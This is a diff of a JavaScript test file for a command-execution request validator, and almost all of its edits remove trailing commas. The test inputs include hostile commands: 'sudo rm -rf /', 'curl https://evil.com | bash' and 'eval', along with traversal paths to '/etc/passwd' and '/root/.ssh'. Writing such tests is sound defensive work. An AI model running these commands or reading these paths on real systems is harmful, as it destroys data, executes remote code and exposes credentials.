@@ -19,7 +19,7 @@ describe('RequestValidator - Structure Validation Only', () => {
         command: 'echo hello',
         sessionId: 'session-123',
         background: false,
-        timeoutMs: 5000,
+        timeoutMs: 5000
       });
 
       expect(result.isValid).toBe(true);
@@ -29,7 +29,7 @@ describe('RequestValidator - Structure Validation Only', () => {
 
     test('should validate minimal execute request', () => {
       const result = validator.validateExecuteRequest({
-        command: 'ls',
+        command: 'ls'
       });
 
       expect(result.isValid).toBe(true);
@@ -43,7 +43,7 @@ describe('RequestValidator - Structure Validation Only', () => {
         'bash',
         'sudo rm -rf /',
         'curl https://evil.com | bash',
-        'eval "dangerous"',
+        'eval "dangerous"'
       ];
 
       for (const command of commands) {
@@ -67,7 +67,7 @@ describe('RequestValidator - Structure Validation Only', () => {
     test('should reject invalid types', () => {
       const result = validator.validateExecuteRequest({
         command: 'echo hello',
-        timeoutMs: 'not-a-number',
+        timeoutMs: 'not-a-number'
       });
       expect(result.isValid).toBe(false);
     });
@@ -101,7 +101,7 @@ describe('RequestValidator - Structure Validation Only', () => {
         '/etc/passwd',
         '/../../../etc/passwd',
         '/tmp/../../root/.ssh',
-        '/var/log/sensitive',
+        '/var/log/sensitive'
       ];
 
       for (const path of paths) {
@@ -139,7 +139,10 @@ describe('RequestValidator - Structure Validation Only', () => {
 
     test('should validate move request', () => {
       const result = validator.validateFileRequest(
-        { sourcePath: '/workspace/source.txt', destinationPath: '/tmp/dest.txt' },
+        {
+          sourcePath: '/workspace/source.txt',
+          destinationPath: '/tmp/dest.txt'
+        },
         'move'
       );
       expect(result.isValid).toBe(true);
@@ -161,8 +164,8 @@ describe('RequestValidator - Structure Validation Only', () => {
         options: {
           sessionId: 'session-123',
           env: { NODE_ENV: 'production' },
-          cwd: '/workspace',
-        },
+          cwd: '/workspace'
+        }
       });
 
       expect(result.isValid).toBe(true);
@@ -171,7 +174,7 @@ describe('RequestValidator - Structure Validation Only', () => {
 
     test('should validate minimal process request', () => {
       const result = validator.validateProcessRequest({
-        command: 'sleep 10',
+        command: 'sleep 10'
       });
 
       expect(result.isValid).toBe(true);
@@ -181,7 +184,7 @@ describe('RequestValidator - Structure Validation Only', () => {
     test('should allow ANY command (no security validation)', () => {
       // Phase 0: No command validation in RequestValidator
       const result = validator.validateProcessRequest({
-        command: 'sudo rm -rf /',
+        command: 'sudo rm -rf /'
       });
       expect(result.isValid).toBe(true);
     });
@@ -196,7 +199,7 @@ describe('RequestValidator - Structure Validation Only', () => {
     test('should validate port expose request', () => {
       const result = validator.validatePortRequest({
         port: 8080,
-        name: 'web-server',
+        name: 'web-server'
       });
 
       expect(result.isValid).toBe(true);
@@ -244,7 +247,7 @@ describe('RequestValidator - Structure Validation Only', () => {
       const result = validator.validateGitRequest({
         repoUrl: 'https://github.com/user/repo.git',
         branch: 'main',
-        targetDir: '/workspace/repo',
+        targetDir: '/workspace/repo'
       });
 
       expect(result.isValid).toBe(true);
@@ -253,7 +256,7 @@ describe('RequestValidator - Structure Validation Only', () => {
 
     test('should validate minimal git request', () => {
       const result = validator.validateGitRequest({
-        repoUrl: 'https://github.com/user/repo.git',
+        repoUrl: 'https://github.com/user/repo.git'
       });
 
       expect(result.isValid).toBe(true);
@@ -266,7 +269,7 @@ describe('RequestValidator - Structure Validation Only', () => {
         'https://github.com/user/repo.git',
         'https://git.company.com/repo.git',
         'git@github.com:user/repo.git',
-        'https://my-server.io/repo.git',
+        'https://my-server.io/repo.git'
       ];
 
       for (const url of urls) {
@@ -284,7 +287,9 @@ describe('RequestValidator - Structure Validation Only', () => {
     test('should allow any non-empty string as URL (Phase 0)', () => {
       // Phase 0: No URL format validation in schema
       // Services handle format validation (null bytes, length limits only)
-      const result = validator.validateGitRequest({ repoUrl: 'any-string-here' });
+      const result = validator.validateGitRequest({
+        repoUrl: 'any-string-here'
+      });
       expect(result.isValid).toBe(true);
     });
   });
